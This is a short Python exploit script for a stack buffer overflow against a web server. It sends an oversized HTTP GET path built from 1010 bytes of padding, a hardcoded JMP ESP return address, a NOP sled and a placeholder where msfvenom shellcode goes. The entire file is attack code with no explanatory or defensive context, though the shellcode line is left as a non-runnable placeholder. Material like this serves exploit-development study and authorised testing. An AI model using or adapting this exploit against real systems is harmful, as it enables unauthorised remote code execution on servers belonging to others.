#!/usr/bin/python
import socket
import sys
import pattern

target = sys.argv[1]
port = 80

buf =  ""
<insert msfvenom generated python shellcode>
SHELL = buf

JMPESP = '\x30\x5c\x34\x7c'

buffer = "A"*1010 + JMPESP + "\x90"*10 + SHELL
buffer += "D"*(1685-len(buffer))

s=socket.socket()
conn=s.connect((target,port))

s.send('GET /' + buffer + ' HTTP/1.1\n\n')
s.close()
